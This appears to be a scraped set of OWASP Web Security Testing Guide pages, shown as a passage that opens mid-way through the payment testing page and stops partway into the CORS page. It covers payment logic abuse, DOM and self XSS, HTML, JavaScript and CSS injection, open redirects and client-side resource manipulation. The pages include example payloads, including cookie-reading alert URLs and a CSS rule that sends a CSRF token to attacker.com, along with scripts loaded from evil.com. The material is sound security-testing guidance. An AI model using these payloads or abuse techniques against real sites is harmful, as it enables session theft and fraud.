Numbers](https://docs.adyen.com/development-resources/test-cards/test-card-numbers)\n- [Globalpay - Test Cards](https://developer.globalpay.com/resources/test-card-numbers)\n- [Stripe - Basic Test Card Numbers](https://stripe.com/docs/testing#cards)\n\n### Testing Logistics\n\nTesting payment functionality on applications can introduce additional complexity, especially if a live site is being tested. Areas that need to be considered include:\n\n- Obtaining test card payment details for the application.\n    - If these are not available, then it may be possible to obtain a pre-paid card or an alternative.\n- Keeping a record of any orders that are made so that they can be cancelled and refunded.\n- Not placing orders that can't be cancelled, or that will cause other actions (such as goods being immediately dispatched from a warehouse).\n\n#### Source Equals Destination\n\nIf the source of the transfer is equal to the destination, it may result in simply adding value to the account without any actual transfer occurring. This scenario should be tested to ensure that the application prevents such operations.\n\n#### Two-Step Payments or Transfers\n\nFor payments or transfers requiring two steps (initiation and confirmation), ensure that checks are performed during both phases. For example:\n\n- Initiate two separate payments.\n- Confirm them individually.\n\nVerify that necessary checks, such as daily limits or balance validations, are performed during the confirmation phase. Failure to do so may lead to negative balances or bypassing limits.\n\n#### Adding Items After Payment Initiation\n\nTest the scenario where a payment is initiated, and items are added to the cart afterward. Confirming the payment may result in marking the added items as paid, which could lead to inconsistencies in the payment process.\n\n#### Race Conditions\n\n- Concurrent Payment Confirmations\n  Initiate multiple confirmation requests (e.g., `POST /confirm-payment`) simultaneously for the same order using tools like Burp Intruder or custom scripts. This may result in the same order being processed multiple times.\n\n- Callback Replay or Flooding\n    Intercept the gateway’s callback request (e.g., to `success.php` or `/payment/callback`) and replay it rapidly in parallel. If the backend lacks proper idempotency checks, this can:\n    - Trigger multiple order fulfillment events (e.g., shipping, credits).\n    - Mark the same order as \"paid\" multiple times.\n    - Cause balance inflation or inventory errors.\n\n#### Multi-Input Systems (Bulk Payments)\n\nIn systems that support bulk payments, test scenarios where the total amount remains positive, but individual inputs include negative values. For example:\n\n```plaintext\naccount_id_1 = $5\naccount_id_2 = -$4\nTotal = $1 paid, but $5 credited\n```\n\nEnsure that the application correctly handles such cases and prevents exploitation.\n\n## Related Test Cases\n\n- [Testing for HTTP Parameter Pollution](../07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution.md)\n- [Testing for SQL Injection](../07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md)\n- [Testing for the Circumvention of Work Flows](06-Testing_for_the_Circumvention_of_Work_Flows.md)\n\n## Remediation\n\n- Avoid storing, transmitting or processing card details wherever possible.\n    - Use a redirect or IFRAME for the payment gateway.\n- Review payment gateway documentation and use all available security features (such as encryption and secure hashes).\n- Handle all pricing related information on server-side:\n    - The only things included in client-side requests should be item IDs and quantities.\n- Implement appropriate input validation and business logic constraints (such as checking for negative item numbers or values).\n- Ensure that application payment flow is robust and that steps can't be performed out of sequence.\n\n## References\n\n- [Payment Card Industry Data Security Standard (PCI DSS)](https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf)\n- [Visa Processing E-Commerce Payments guidance](https://www.visa.co.uk/dam/VCOM/regional/ve/unitedkingdom/PDF/risk/processing-e-commerce-payments-guide-73-17337.pdf)\n", "timestamp": "2025-10-24T11:39:57.144509"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/README.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/README.md", "content": "# 4.10 Business Logic Testing\n\n4.10.0 [Introduction to Business Logic](00-Introduction_to_Business_Logic.md)\n\n4.10.1 [Test Business Logic Data Validation](01-Test_Business_Logic_Data_Validation.md)\n\n4.10.2 [Test Ability to Forge Requests](02-Test_Ability_to_Forge_Requests.md)\n\n4.10.3 [Test Integrity Checks](03-Test_Integrity_Checks.md)\n\n4.10.4 [Test for Process Timing](04-Test_for_Process_Timing.md)\n\n4.10.5 [Test Number of Times a Function Can Be Used Limits](05-Test_Number_of_Times_a_Function_Can_Be_Used_Limits.md)\n\n4.10.6 [Testing for the Circumvention of Work Flows](06-Testing_for_the_Circumvention_of_Work_Flows.md)\n\n4.10.7 [Test Defenses Against Application Misuse](07-Test_Defenses_Against_Application_Misuse.md)\n\n4.10.8 [Test Upload of Unexpected File Types](08-Test_Upload_of_Unexpected_File_Types.md)\n\n4.10.9 [Test Upload of Malicious Files](09-Test_Upload_of_Malicious_Files.md)\n\n4.10.10 [Test Payment Functionality](10-Test-Payment-Functionality.md)\n", "timestamp": "2025-10-24T11:39:57.228981"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting.md", "content": "# Testing for DOM-Based Cross Site Scripting\n\n|ID          |\n|------------|\n|WSTG-CLNT-01|\n\n## Summary\n\n[DOM-based cross-site scripting](https://owasp.org/www-community/attacks/DOM_Based_XSS) is the de-facto name for [XSS](https://owasp.org/www-community/attacks/xss/) bugs that are the result of active browser-side content on a page, typically JavaScript, obtaining user input through a [source](https://github.com/wisec/domxsswiki/wiki/sources) and using it in a [sink](https://github.com/wisec/domxsswiki/wiki/Sinks), leading to the execution of injected code. This document only discusses JavaScript bugs which lead to XSS.\n\nThe DOM, or [Document Object Model](https://en.wikipedia.org/wiki/Document_Object_Model), is the structural format used to represent documents in a browser. The DOM enables dynamic scripts such as JavaScript to reference components of the document such as a form field or a session cookie. The DOM is also used by the browser for security - for example to limit scripts on different domains from obtaining session cookies for other domains. A DOM-based XSS vulnerability may occur when active content, such as a JavaScript function, is modified by a specially crafted request such that a DOM element that can be controlled by an attacker.\n\nNot all XSS bugs require the attacker to control the content returned from the server, but can instead abuse poor JavaScript coding practices to achieve the same results. The consequences are the same as a typical XSS flaw, only the means of delivery is different.\n\nIn comparison to other types of cross site scripting vulnerabilities ([reflected and stored](https://owasp.org/www-community/attacks/xss/), where an un-sanitized parameter is passed by the server then returned to the user and executed in the context of the user's browser, a DOM-based XSS vulnerability controls the flow of the code by using elements of the Document Object Model (DOM) along with code crafted by the attacker to change the flow.\n\nDue to their nature, DOM-based XSS vulnerabilities can be executed in many instances without the server being able to determine what is actually being executed. This may make many of the general XSS filtering and detection techniques impotent to such attacks.\n\nThis hypothetical example uses the following client-side code:\n\n```html\n<script>\ndocument.write(\"Site is at: \" + document.location.href + \".\");\n</script>\n```\n\nAn attacker may append `#<script>alert('xss')</script>` to the affected page URL which would, when executed, display the alert box. In this instance, the appended code would not be sent to the server as everything after the `#` character is not treated as part of the query by the browser, but as a fragment. In this example, the code is immediately executed and an alert of \"xss\" is displayed by the page. Unlike the more common types of cross site scripting ([reflected and stored](https://owasp.org/www-community/attacks/xss/) in which the code is sent to the server and then back to the browser, this is executed directly in the user's browser without server contact.\n\nThe [consequences](https://owasp.org/www-community/attacks/xss/) of DOM-based XSS flaws are as wide ranging as those seen in more well known forms of XSS, including cookie retrieval, further malicious script injection, etc., and should therefore be treated with the same severity.\n\n## Test Objectives\n\n- Identify DOM sinks.\n- Build payloads that pertain to every sink type.\n\n## How to Test\n\nJavaScript applications differ significantly from other types of applications because they are often dynamically generated by the server. To understand what code is being executed, the website being tested needs to be crawled to determine all the instances of JavaScript being executed and where user input is accepted. Many websites rely on large libraries of functions, which often stretch into the hundreds of thousands of lines of code and have not been developed in-house. In these cases, top-down testing often becomes the only viable option, since many bottom level functions are never used, and analyzing them to determine which are sinks will use up more time than is often available. The same can also be said for top-down testing if the inputs or lack thereof is not identified to begin with.\n\nUser input comes in two main forms:\n\n- Input written to the page by the server in a way that does not allow direct XSS, and\n- Input obtained from client-side JavaScript objects.\n\nHere are two examples of how the server may insert data into JavaScript:\n\n```js\nvar data = \"<escaped data from the server>\";\nvar result = someFunction(\"<escaped data from the server>\");\n```\n\nHere are two examples of input from client-side JavaScript objects:\n\n```js\nvar data = window.location;\nvar result = someFunction(window.referrer);\n```\n\nWhile there is little difference to the JavaScript code in how they are retrieved, it is important to note that when input is received via the server, the server can apply any permutations to the data that it desires. On the other hand, the permutations performed by JavaScript objects are fairly well understood and documented. If `someFunction` in the above example were a sink, then the exploitability in the former case would depend on the filtering done by the server, whereas in the latter case it would depend on the encoding done by the browser on the `window.referrer` object. Stefano Di Paulo has written an excellent article on what browsers return when asked for the various elements of a [URL using the document and location attributes](https://github.com/wisec/domxsswiki/wiki/location,-documentURI-and-URL-sources).\n\nAdditionally, JavaScript is often executed outside of `<script>` blocks, as evidenced by the many vectors which have led to XSS filter bypasses in the past. When crawling the application, it is important to note the use of scripts in places such as event handlers and CSS blocks with expression attributes. Also, note that any off-site CSS or script objects will need to be assessed to determine what code is being executed.\n\nAutomated testing has only very limited success at identifying and validating DOM-based XSS as it usually identifies XSS by sending a specific payload and attempts to observe it in the server response. This may work fine for the simple example provided below, where the message parameter is reflected back to the user:\n\n```html\n<script>\nvar pos=document.URL.indexOf(\"message=\")+5;\ndocument.write(document.URL.substring(pos,document.URL.length));\n</script>\n```\n\nHowever, it may not be detected in the following contrived case:\n\n```html\n<script>\nvar navAgt = navigator.userAgent;\n\nif (navAgt.indexOf(\"MSIE\")!=-1) {\n        document.write(\"You are using IE as a browser and visiting site: \" + document.location.href + \".\");\n}\nelse\n{\n    document.write(\"You are using an unknown browser.\");\n}\n</script>\n```\n\nFor this reason, automated testing will not detect areas that may be susceptible to DOM-based XSS unless the testing tool can perform additional analysis of the client-side code.\n\nManual testing should therefore be undertaken and can be done by examining areas in the code where parameters are referred to that may be useful to an attacker. Examples of such areas include places where code is dynamically written to the page and elsewhere where the DOM is modified or even where scripts are directly executed.\n\n## Remediation\n\nFor measures to prevent DOM-based XSS, see the [DOM-based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).\n\n## References\n\n- [DomXSSWiki](https://github.com/wisec/domxsswiki/wiki/)\n", "timestamp": "2025-10-24T11:39:57.925556"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/11-Client-side_Testing/01.1-Testing_for_Self_DOM_Based_Cross_Site_Scripting.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/01.1-Testing_for_Self_DOM_Based_Cross_Site_Scripting.md", "content": "# Testing for Self DOM Based Cross-Site Scripting\n\n## Summary\n\nSelf DOM-Based Cross-Site Scripting is a specific attack and needs prior knowledge of DOM-Based cross site scripting and successful social engineering. The term 'self' is a reference here to the fact, that the user needs to inject the payload into the input field, and thus execute the vulnerability themselves. The vulnerability is further specific, as the website's Content Security Policy (CSP) can block the execution of scripts.\n\nThis scenario will use the term \"sink\" in the following manner: In computing, a sink, event sink or data sink is a class or function designed to receive input or events from another object or function. Thus in order to find possible vulnerabilities we first need to identify the sinks of the application we want to test.\n\n## How to Test\n\nThe process of testing for Self DOM-Based cross site scripting follows:\n\n1. Look for vulnerable sinks, which allow user input.\n2. Once a possible sink is identified, a payload can be inserted.\n3. Check the error log in the browser's developer tools to see the outcome, and draw your conclusions.\n4. Check if an attacker could convince a user to insert the payload with no extensive technical knowledge required.\n\n### Example\n\nThis specific example is from this [hackerone ticket](https://hackerone.com/reports/406587).\n\nIn the example the following JavaScript function is executed on the website `https://example.com`.\n\n```js\n//Marketo Form Code\nfunction strip(html) {\n    var tmp = document.createElement(\"DIV\");\n    tmp.innerHTML = html;\n    return tmp.textContent || tmp.innerText || \"\";\n}\n\n$('form').submit(function() {\n    $('textarea').val(function() {\n        return strip($(this).val());\n    });\n});\n```\n\nAbuse of this functionality can be described as follows:\n\n1. The `submit` event handler passes the current value of any `textarea` elements to the `strip` function.\n2. This function creates a new `div` element and sets the `innerHTML` property to the provided value.\n3. In the last step it then returns the `textContent` property of the resulting `div`.\n\n This type of code is typically used to remove HTML tags from a string, as the `textContent` property contains the string which was rendered by the browser when the HTML was parsed. This particular method is inherently insecure because it uses `innerHTML`. When user input is provided to the `innerHTML` property, it is parsed by the web browser and can therefore lead to the execution of malicious JavaScript.\n\nThe following payload can be used to test the vulnerability.`<img src=x onerror=alert(1) />`\n\nThe developer console would display two errors: One which indicates that `https://www.example.com/x` was requested and returned a 404 (due to the src attribute of the img tag). Another which reported a violation of the website's CSP.\n\nThis second error occurred because the browser attempts to execute the JavaScript code in the `onerror` attribute, but the website's CSP prevented the execution. Performing the same actions in a browser with CSP disabled allowed the JavaScript in the `onerror` attribute to execute.\n\nAn attacker could exploit this vulnerability by convincing a user to paste a malicious payload into the 'message' field of the contact form and then click the 'send message' button. This attack could be enhanced by convincing the user to use a browser version which does not support CSP.\n\n## Remediation\n\nIn order to properly protect services from DOM based XSS, refer to the [DOM based XSS prevention cheat sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).\n\n### References\n\n- [OWASP - DOM-Based Cross Site Scripting](https://owasp.org/www-community/attacks/DOM_Based_XSS)\n- [CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)\n", "timestamp": "2025-10-24T11:39:58.000046"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/11-Client-side_Testing/02-Testing_for_JavaScript_Execution.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/02-Testing_for_JavaScript_Execution.md", "content": "# Testing for JavaScript Execution\n\n|ID          |\n|------------|\n|WSTG-CLNT-02|\n\n## Summary\n\nA JavaScript injection vulnerability is a subtype of cross site scripting (XSS) that involves the ability to inject arbitrary JavaScript code that is executed by the application inside the victim's browser. This vulnerability can have many consequences, like the disclosure of a user's session cookies that could be used to impersonate the victim, or, more generally, it can allow the attacker to modify the page content seen by the victims or the application's behavior.\n\nJavaScript injection vulnerabilities can occur when the application lacks proper user-supplied input and output validation. As JavaScript is used to dynamically populate web pages, this injection occurs during this content processing phase and consequently affects the victim.\n\nWhen testing for this vulnerability, consider that some characters are treated differently by different browsers. For reference, see [DOM-based XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS).\n\nHere is an example of a script that does not perform any validation of the variable `rr`. The variable contains user-supplied input via the query string, and additionally does not apply any form of encoding:\n\n```js\nvar rr = location.search.substring(1);\nif(rr) {\n    window.location=decodeURIComponent(rr);\n}\n```\n\nThis implies that an attacker could inject JavaScript code simply by submitting the following query string: `www.victim.com/?javascript:alert(1)`.\n\n## Test Objectives\n\n- Identify sinks and possible JavaScript injection points.\n\n## How to Test\n\nConsider the following: [DOM XSS exercise](http://www.domxss.com/domxss/01_Basics/04_eval.html)\n\nThe page contains the following script:\n\n```html\n<script>\nfunction loadObj(){\n    var cc=eval('('+aMess+')');\n    document.getElementById('mess').textContent=cc.message;\n}\n\nif(window.location.hash.indexOf('message')==-1) {\n    var aMess='({\"message\":\"Hello User!\"})';\n} else {\n    var aMess=location.hash.substr(window.location.hash.indexOf('message=')+8)\n}\n</script>\n```\n\nThe above code contains a source `location.hash` that is controlled by the attacker that can inject directly in the `message` value a JavaScript Code to take the control of the user browser.\n", "timestamp": "2025-10-24T11:39:58.094306"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection.md", "content": "# Testing for HTML Injection\n\n|ID          |\n|------------|\n|WSTG-CLNT-03|\n\n## Summary\n\nHTML injection is a type of injection vulnerability that occurs when a user is able to control an input point and is able to inject arbitrary HTML code into a vulnerable web page. This vulnerability can have many consequences, like disclosure of a user's session cookies that could be used to impersonate the victim, or, more generally, it can allow the attacker to modify the page content seen by the victims.\n\nThis vulnerability occurs when user input is not correctly sanitized and the output is not encoded. An injection allows the attacker to send a malicious HTML page to a victim. The targeted browser will not be able to distinguish (trust) legitimate parts from malicious parts of the page, and consequently will parse and execute the whole page in the victim's context.\n\nThere is a wide range of methods and attributes that could be used to render HTML content. If these methods are provided with an untrusted input, then there is an high risk of HTML injection vulnerability. For example, malicious HTML code can be injected via the `innerHTML` JavaScript method, usually used to render user-inserted HTML code. If strings are not correctly sanitized, the method can enable HTML injection. A JavaScript function that can be used for this purpose is `document.write()`.\n\nThe following example shows a snippet of vulnerable code that allows an unvalidated input to be used to create dynamic HTML in the page context:\n\n```js\nvar userposition=location.href.indexOf(\"user=\");\nvar user=location.href.substring(userposition+5);\ndocument.getElementById(\"Welcome\").innerHTML=\" Hello, \"+user;\n```\n\nThe following example shows vulnerable code using the `document.write()` function:\n\n```js\nvar userposition=location.href.indexOf(\"user=\");\nvar user=location.href.substring(userposition+5);\ndocument.write(\"<h1>Hello, \" + user +\"</h1>\");\n```\n\nIn both examples, this vulnerability can be exploited with an input such as:\n\n```text\nhttps://vulnerable.site/page.html?user=<img%20src='aaa'%20onerror=alert(1)>\n```\n\nThis input will add an image tag to the page that will execute arbitrary JavaScript code inserted by the malicious user in the HTML context.\n\n## Test Objectives\n\n- Identify HTML injection points and assess the severity of the injected content.\n\n## How to Test\n\nConsider the following DOM XSS exercise <https://www.domxss.com/domxss/01_Basics/06_jquery_old_html.html>\n\nThe HTML code contains the following script:\n\n```html\n<script src=\"../js/jquery-1.7.1.js\"></script>\n<script>\nfunction setMessage(){\n    var t=location.hash.slice(1);\n    $(\"div[id=\"+t+\"]\").text(\"The DOM is now loaded and can be manipulated.\");\n}\n$(document).ready(setMessage  );\n$(window).bind(\"hashchange\",setMessage)\n</script>\n<body>\n    <script src=\"../js/embed.js\"></script>\n    <span><a href=\"#message\" > Show Here</a><div id=\"message\">Showing Message1</div></span>\n    <span><a href=\"#message1\" > Show Here</a><div id=\"message1\">Showing Message2</div>\n    <span><a href=\"#message2\" > Show Here</a><div id=\"message2\">Showing Message3</div>\n</body>\n```\n\nIt is possible to inject HTML code.\n", "timestamp": "2025-10-24T11:39:58.201509"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect.md", "content": "# Testing for Client-side URL Redirect\n\n|ID          |\n|------------|\n|WSTG-CLNT-04|\n\n## Summary\n\nThis section describes how to check for client-side URL redirection, also known as open redirection. It is an input validation flaw that exists when an application accepts user-controlled input that specifies a link which leads to an external URL that could be malicious. This kind of vulnerability could be used to accomplish a phishing attack or redirect a victim to an infection page.\n\nThis vulnerability occurs when an application accepts untrusted input that contains a URL value and does not sanitize it. This URL value could cause the web application to redirect the user to another page, such as a malicious page controlled by the attacker.\n\nThis vulnerability may enable an attacker to successfully launch a phishing scam and steal user credentials. Since the redirection is originated by the real application, the phishing attempts may have a more trustworthy appearance.\n\nHere is an example of a phishing attack URL.\n\n```text\nhttps://www.target.site?#redirect=www.fake-target.site\n```\n\nThe victim that visits this URL will be automatically redirected to `fake-target.site`, where an attacker could place a fake page that resembles the intended site, in order to steal the victim's credentials.\n\nOpen redirection could also be used to craft a URL that would bypass the application’s access control checks and forward the attacker to privileged functions that they would normally not be able to access.\n\n## Test Objectives\n\n- Identify injection points that handle URLs or paths.\n- Assess the locations that the system could redirect to.\n\n## How to Test\n\nWhen testers manually check for this type of vulnerability, they first identify if there are client-side redirections implemented in the client-side code. These redirections may be implemented, to give a JavaScript example, using the `window.location` object. This can be used to direct the browser to another page by simply assigning a string to it. This is demonstrated in the following snippet:\n\n```js\nvar redir = location.hash.substring(1);\nif (redir) {\n    window.location='https://'+decodeURIComponent(redir);\n}\n```\n\nIn this example, the script does not perform any validation of the variable `redir` which contains the user-supplied input via the query string. Since no form of encoding is applied, this unvalidated input is passed to the `windows.location` object, creating a URL redirection vulnerability.\n\nThis implies that an attacker could redirect the victim to a malicious site simply by submitting the following query string:\n\n```text\nhttps://www.victim.site/?#www.malicious.site\n```\n\nWith a slight modification, the above example snippet can be vulnerable to JavaScript injection.\n\n```js\nvar redir = location.hash.substring(1);\nif (redir) {\n    window.location=decodeURIComponent(redir);\n}\n```\n\nThis can be exploited by submitting the following query string:\n\n```text\nhttps://www.victim.site/?#javascript:alert(document.cookie)\n```\n\nWhen testing for this vulnerability, consider that some characters are treated differently by different browsers. For reference, see [DOM-based XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS).\n", "timestamp": "2025-10-24T11:39:58.260215"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/11-Client-side_Testing/05-Testing_for_CSS_Injection.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/05-Testing_for_CSS_Injection.md", "content": "# Testing for CSS Injection\n\n|ID          |\n|------------|\n|WSTG-CLNT-05|\n\n## Summary\n\nA CSS Injection vulnerability involves the ability to inject arbitrary CSS code in the context of a trusted web site which is rendered inside a victim's browser. The impact of this type of vulnerability varies based on the supplied CSS payload. It may lead to cross site scripting or data exfiltration.\n\nThis vulnerability occurs when the application allows user-supplied CSS to interfere with the application's legitimate style sheets. Injecting code in the CSS context may provide an attacker with the ability to execute JavaScript in certain conditions, or to extract sensitive values using CSS selectors and functions able to generate HTTP requests. Generally, allowing users the ability to customize pages by supplying custom CSS files is a considerable risk.\n\nThe following JavaScript code shows a possible vulnerable script in which the attacker is able to control the `location.hash` (source) which reaches the `cssText` function (sink). This particular case may lead to DOM-based XSS in older browser versions; for more information, see the [DOM-based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).\n\n```html\n<a id=\"a1\">Click me</a>\n<script>\n    if (location.hash.slice(1)) {\n    document.getElementById(\"a1\").style.cssText = \"color: \" + location.hash.slice(1);\n    }\n</script>\n```\n\nThe attacker could target the victim by asking them to visit the following URLs:\n\n- `www.victim.com/#red;-o-link:'<javascript:alert(1)>';-o-link-source:current;` (Opera \\[8,12\\])\n- `www.victim.com/#red;-:expression(alert(URL=1));` (IE 7/8)\n\nThe same vulnerability may appear in the case of reflected XSS, for example, in the following PHP code:\n\n```html\n<style>\np {\n    color: <?php echo $_GET['color']; ?>;\n    text-align: center;\n}\n</style>\n```\n\nFurther attack scenarios involve the ability to extract data through the adoption of pure CSS rules. Such attacks can be conducted through CSS selectors, leading to the exfiltration of data, for example, CSRF tokens.\n\nHere is an example of code that attempts to select an input with a `name` matching `csrf_token` and a `value` beginning with an `a`. By utilizing a brute-force attack to determine the attribute's `value`, it is possible to carry out an attack that sends the value to the attacker's domain, such as by attempting to set a background image on the selected input element.\n\n```html\n<style>\ninput[name=csrf_token][value=^a] {\n    background-image: url(https://attacker.com/log?a);\n}\n</style>\n```\n\nOther attacks using solicited content such as CSS are highlighted in [Mario Heiderich's talk, \"Got Your Nose\"](https://www.youtube.com/watch?v=FIQvAaZj_HA) on YouTube.\n\n## Test Objectives\n\n- Identify CSS injection points.\n- Assess the impact of the injection.\n\n## How to Test\n\nCode should be analyzed to determine if a user is permitted to inject content in the CSS context. Particularly, the way in which the website returns CSS rules on the basis of the inputs should be inspected.\n\nThe following is a basic example:\n\n```html\n<a id=\"a1\">Click me</a>\n<b>Hi</b>\n<script>\n    $(\"a\").click(function(){\n        $(\"b\").attr(\"style\",\"color: \" + location.hash.slice(1));\n    });\n</script>\n```\n\nThe above code contains a source `location.hash`, controlled by the attacker, that can inject directly in the `style` attribute of an HTML element. As mentioned above, this may lead to different results depending on the browser in use and the supplied payload.\n\nThe following pages provide examples of CSS injection vulnerabilities:\n\n- [Password \"cracker\" via CSS and HTML5](https://html5sec.org/invalid/?length=25)\n- [JavaScript based attacks using `CSSStyleDeclaration` with unescaped input](https://github.com/wisec/domxsswiki/wiki/CSS-Text-sink)\n\nFor further OWASP resources on preventing CSS injection, see the [Securing Cascading Style Sheets Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Securing_Cascading_Style_Sheets_Cheat_Sheet.html).\n", "timestamp": "2025-10-24T11:39:58.370508"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/11-Client-side_Testing/06-Testing_for_Client-side_Resource_Manipulation.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/06-Testing_for_Client-side_Resource_Manipulation.md", "content": "# Testing for Client-side Resource Manipulation\n\n|ID          |\n|------------|\n|WSTG-CLNT-06|\n\n## Summary\n\nA client-side resource manipulation vulnerability is an input validation flaw. It occurs when an application accepts user-controlled input that specifies the path of a resource such as the source of an iframe, JavaScript, applet, or the handler of an XMLHttpRequest. This vulnerability consists of the ability to control the URLs that link to some resources present in a web page. The impact of this vulnerability varies, and it is usually adopted to conduct XSS attacks. This vulnerability makes it is possible to interfere with the expected application's behavior by causing it to load and render malicious objects.\n\nThe following JavaScript code shows a possible vulnerable script in which an attacker is able to control the `location.hash` (source) which reaches the attribute `src` of a script element. This particular case leads to a XSS attack as external JavaScript could be injected.\n\n```html\n<script>\n    var d=document.createElement(\"script\");\n    if(location.hash.slice(1)) {\n        d.src = location.hash.slice(1);\n    }\n    document.body.appendChild(d);\n</script>\n```\n\nAn attacker could target a victim by causing them to visit this URL:\n\n`www.victim.com/#https://evil.com/js.js`\n\nWhere `js.js` contains:\n\n```js\nalert(document.cookie)\n```\n\nThis would cause the alert to pop up on the victim's browser.\n\nA more damaging scenario involves the possibility of controlling the URL called in a CORS request. Since CORS allows the target resource to be accessible by the requesting domain through a header-based approach, the attacker may ask the target page to load malicious content from its own website.\n\nHere is an example of a vulnerable page:\n\n```html\n<b id=\"p\"></b>\n<script>\n    function createCORSRequest(method, url) {\n        var xhr = new XMLHttpRequest();\n        xhr.open(method, url, true);\n        xhr.onreadystatechange = function () {\n            if (this.status == 200 && this.readyState == 4) {\n                document.getElementById('p').innerHTML = this.responseText;\n            }\n        };\n        return xhr;\n    }\n\n    var xhr = createCORSRequest('GET', location.hash.slice(1));\n    xhr.send(null);\n</script>\n```\n\nThe `location.hash` is controlled by user input and is used for requesting an external resource, which will then be reflected through the construct `innerHTML`. An attacker could ask a victim to visit the following URL:\n\n`www.victim.com/#https://evil.com/html.html`\n\nWith the payload handler for `html.html`:\n\n```html\n<?php\nheader('Access-Control-Allow-Origin: https://www.victim.com');\n?>\n<script>alert(document.cookie);</script>\n```\n\n## Test Objectives\n\n- Identify sinks with weak input validation.\n- Assess the impact of the resource manipulation.\n\n## How to Test\n\nTo manually check for this type of vulnerability, we must identify whether the application employs inputs without correctly validating them. If so, these inputs are under the control of the user and could be used to specify external resources. Since there are many resources that could be included in the application (such as images, video, objects, css, and iframes), the client-side scripts that handle the associated URLs should be investigated for potential issues.\n\nThe following table shows possible injection points (sink) that should be checked:\n\n| Resource Type   | Tag/Method                                | Sink   |\n| --------------- | ----------------------------------------- | ------ |\n| Frame           | iframe                                    | src    |\n| Link            | a                                         | href   |\n| AJAX Request    | `xhr.open(method, [url], true);` | URL    |\n| CSS             | link                                      | href   |\n| Image           | img                                       | src    |\n| Object          | object                                    | data   |\n| Script          | script                                    | src    |\n\nThe most interesting ones are those that allow to an attacker to include client-side code (for example JavaScript) that could lead to XSS vulnerabilities.\n", "timestamp": "2025-10-24T11:39:58.439553"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing.md", "content": "# Testing Cross Origin Resource Sharing\n\n|ID          |\n|------------|\n|WSTG-CLNT-07|\n\n## Summary\n\n[Cross Origin Resource Sharing](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing) (CORS) is a mechanism that enables a web browser to perform cross-domain requests using the XMLHttpRequest (XHR) Level 2 (L2) API in a controlled manner. In the past, the XHR L1 API only allowed requests to be sent within the same origin as it was restricted by the [Same Origin Policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy) (SOP).\n\nCross-origin requests have an `Origin` header that identifies the domain initiating the request and is always sent to the server. CORS defines the protocol to use between a web browser and a server to determine whether a cross-origin request is allowed. HTTP [headers](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing#Headers) are used to accomplish this.\n\nThe [W3C CORS specification](https://www.w3.org/TR/cors/) mandates that for non simple requests, such as requests other than GET or POST or requests that uses credentials, a pre-flight OPTIONS request must be sent in advance to check if the type of request will have a bad impact on the data. The pre-flight request checks the methods and headers allowed by the server, and if credentials are permitted. Based on the result of the OPTIONS request, the browser decides whether the request is allowed or not.\n\n### Origin & Access-Control-Allow-Origin\n\nThe `Origin` request header is always sent by the browser in a CORS request and indicates the origin of the request. The Origin header cannot be changed from JavaScript as [the browser (the user-agent) blocks its modification](https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name); however, relying on this header for Access Control checks is not a good idea as it may be spoofed outside the browser, for example by using a proxy, so you still need to check that application-level protocols are used to protect sensitive data.\n\n`Access-Control-Allow-Origin` is a response header used by a server to indicate which domains are allowed to read the response. Based on the CORS W3 Specification it is up to the client to determine and enforce the restriction of whether the client has access to the response data based on this header.\n\nFrom a security testing perspective you should look for insecure configurations as for example using a `*` wildcard as value of the `Access-Control-Allow-Origin` header that means all domains are allowed. Another insecure example is when the server returns back the origin header without any additional checks, which can lead to access of sensitive data. Note that the configuration of allowing cross-origin requests is very insecure and is not acceptable in general terms, except in the case of a public API that is intended to be accessible by everyone.\n\n### 